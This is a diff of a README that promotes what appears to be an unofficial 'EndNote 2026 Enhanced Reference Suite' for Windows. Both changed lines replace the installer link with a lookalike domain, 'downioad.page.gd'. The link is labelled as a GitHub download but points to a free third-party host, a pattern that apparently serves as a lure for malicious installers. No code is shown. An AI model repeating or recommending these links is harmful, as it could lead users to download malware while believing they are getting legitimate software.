@@ -2,7 +2,7 @@
 
 EndNote 2026 Enhanced Reference Suite is a powerful desktop tool designed to elevate your academic workflow with advanced reference management features. Tailored for Windows 10 and 11, this suite integrates seamlessly with EndNote, offering enhanced output styles, manuscript matching capabilities, and library synchronization options to streamline your research and writing processes in 2026.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -57,6 +57,6 @@ A: Updates are available through the suite's settings menu under "Tools > Check 
 
 To get started with the EndNote 2026 Enhanced Reference Suite, download the latest version from the link below:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 This package is updated regularly to ensure compatibility and add new features. Last Updated: November 2026. For support or contributions, visit our GitHub repository. All rights reserved © 2026 EndNote Enhanced Suite Team.
